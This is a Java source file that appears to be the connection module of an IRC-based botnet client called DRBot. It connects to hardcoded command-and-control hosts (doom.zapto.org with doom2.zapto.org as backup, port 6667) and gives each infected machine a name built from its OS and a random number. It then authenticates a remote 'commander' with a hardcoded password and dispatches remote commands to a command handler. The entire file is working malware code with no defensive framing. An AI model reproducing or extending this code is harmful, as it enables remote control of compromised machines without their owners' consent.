package InitConn;

import com.DRBot.Commands.myCommands;
import com.DRBot.OS.OsProp;
import com.DRBot.SecureLine.SecureLine;
import java.net.Socket;
import java.net.Inet4Address;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ConnectException;
import java.net.UnknownHostException;


/**
 *
 * @author MerNat
 */

public class InitConn implements Runnable{
    private String myServer;
    private String myBackUpServer;
    private final String pass;
    private final int port;
    private String[] myComm;
    private String toComm;
    private String botName;
    private String botNameSend;
    private OutputStreamWriter outWriter;
    private InputStreamReader inReader;
    private PrintWriter writer;
    private BufferedReader reader;
    private Socket mySocket;
    private Inet4Address inetAdd;
    private final boolean toConn;
    private final long timeSleep;
    private int counter = 5;
    private boolean auth;
    private final myCommands myCommandClass;
    private final SecureLine secureLine;
    
    public InitConn(String myServer,String myBackUpServer,int port,String pass,boolean Engaged){
        this.myServer = myServer;
        this.myBackUpServer = myBackUpServer;
        this.port = port;
        this.pass = pass;
        this.toConn = Engaged;
        timeSleep = 3000;
        myCommandClass = new myCommands();
        auth = false;
        if(toConn == true){connection();}
        secureLine = new SecureLine();
        genNick();
    }
    private void genNick(){
        String temp = new OsProp().shortOs();
        int random = (int)(Math.random()*500000);
        botName = temp + "_" + random;
        botNameSend = "**"+temp + "_" + random;
    }
    private String getNickSend(){
        return botNameSend+secureLine.getSecret();
    }
    @Override
    public void run(){
        
            try {
                connectToServer();
                getStreams();
                sendData(getNickSend()); //the client decides the shit first then the 
                processConn(writer,reader);
            } catch (IOException ex) {}
            finally{
                closeConnection();
            }
    }
    private void connection(){
        Thread newConn = new Thread(new InitConn("doom.zapto.org","doom2.zapto.org",6667,"Dearmama1!",false));
        newConn.start();
    }
    private void connectToServer(){
        try{
            inetAdd = (Inet4Address)Inet4Address.getByName(myServer);
            mySocket = new Socket(inetAdd,port);
        }
        catch(UnknownHostException un){
            try{
                Thread.sleep(timeSleep);
                counter--;
                if(counter==1){
                    counter = 5;
                    String temp = myServer;
                    myServer = myBackUpServer;
                    myBackUpServer = temp;
                }
                run();
            }
            catch(InterruptedException inter){}
        }
        catch(ConnectException connEx){
            try{
                Thread.sleep(timeSleep);
                counter--;
                if(counter==1){
                    counter = 5;
                    String temp = myServer;
                    myServer = myBackUpServer;
                    myBackUpServer = temp;
                }
                run();
            }
            catch(InterruptedException inter){}
        }
        catch(IOException ioEx){
            try{
                Thread.sleep(timeSleep);
                counter--;
                if(counter==1){
                    counter = 5;
                    String temp = myServer;
                    myServer = myBackUpServer;
                    myBackUpServer = temp;
                }
                run();
            }
            catch(InterruptedException inter){}
        } catch (NullPointerException ex) {} 
    }
    private void getStreams()throws IOException{
        writer = new PrintWriter(mySocket.getOutputStream());
        reader = new BufferedReader(new InputStreamReader(mySocket.getInputStream()));        
    }
    private synchronized void processConn(PrintWriter write,BufferedReader read)throws IOException{  
                String msg;
                while((msg = read.readLine())!= null){
                    msg = secureLine.decrypt(msg);
                    if(getMessage(msg)!=null && getMessage(msg).equals(">login "+pass) && auth == false){
                        write.println(secureLine.encrypt("commander you are logged in."));
                        write.flush();
                        auth = true;
                    }
                    else
                        if(auth == true && getMessage(msg)!=null){
                            String myCommand = getMessage(msg).replace(">","");
                            if(myCommand.indexOf(" ")>=0){
                                myComm = myCommand.split(" ");
                                toComm = myComm[0];
                            }
                            else{
                                toComm = myCommand;
                            }
                            int indexComm = myCommandClass.isCommand(toComm);
                            if(indexComm!=-1){
                                try {
                                    myCommandClass.analyzeCommand(inetAdd,indexComm,myComm,write,botName,secureLine);
                                } catch (NullPointerException ex) {} catch (InterruptedException ex) {}
                            }
                        }
                }
    }
    private String getMessage(String ircMsg){
        int po = ircMsg.lastIndexOf(":");
        String temp = ircMsg.substring(po+1);
        if(temp.startsWith(">")){
            return temp;
        }
        else{
            return null;
        }
    }
    private void closeConnection(){
        try {
            writer.close();
            reader.close();
        } catch (IOException ex) {}
    }
    private void sendData(String msg){
            writer.println(msg);
            writer.flush();
    }
}
